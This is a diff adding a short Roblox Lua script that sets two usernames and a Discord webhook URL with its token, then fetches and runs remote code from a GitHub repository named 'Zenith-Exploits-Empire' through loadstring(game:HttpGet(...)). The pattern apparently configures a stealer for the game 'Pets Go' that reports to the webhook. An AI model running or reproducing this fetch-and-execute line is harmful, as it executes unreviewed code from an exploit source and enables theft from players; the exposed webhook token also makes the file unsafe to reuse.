@@ -1,0 +1,5 @@
+Username = "clamyu_11"
+Username2 = "clamyu_11"
+Webhook = "https://discord.com/api/webhooks/1365242221573701695/AbvpMwXo4NCyiOu8TYIVENrC6t0XKxzQeO6FhOIAhm94330zMTC0GkLEGoq6xf1zIOAp"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20pets%20go"))()
